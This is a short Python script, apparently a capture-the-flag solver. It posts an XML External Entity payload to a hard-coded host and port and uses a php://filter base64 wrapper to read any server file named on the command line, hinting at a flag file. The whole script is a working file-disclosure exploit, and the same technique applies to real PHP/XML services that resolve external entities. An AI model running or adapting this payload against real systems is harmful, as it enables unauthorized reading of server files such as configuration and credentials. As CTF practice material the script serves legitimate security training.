#!/usr/bin/python

import base64
import requests
import sys

if len(sys.argv) <= 1:
    print('You must specify a file to retrieve (the flag is at /var/www/html/flag.txt)')
    exit(1)

HOST = "199.247.6.180"
PORT = 12001

URL = "http://{}:{}/".format(HOST, PORT)

EXPLOIT = '<!DOCTYPE x [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file://{}">]><message>&xxe;</message>'.format(sys.argv[1])

result = requests.post(URL, data=EXPLOIT)

text = result.text
if 'I/O warning : failed' in text:
    print('File not found', file=sys.stderr)
    exit(1)
elif 'xmlLoadEntityContent input error' in text:
    print('Access denied', file=sys.stderr)
    exit(1)
if not text.startswith('Your wish: '):
    print('Invalid response', file=sys.stderr)
    print(text, file=sys.stderr)
    exit(0)

sys.stdout.buffer.write(base64.b64decode(result.content[11:]))
sys.stdout.buffer.flush()
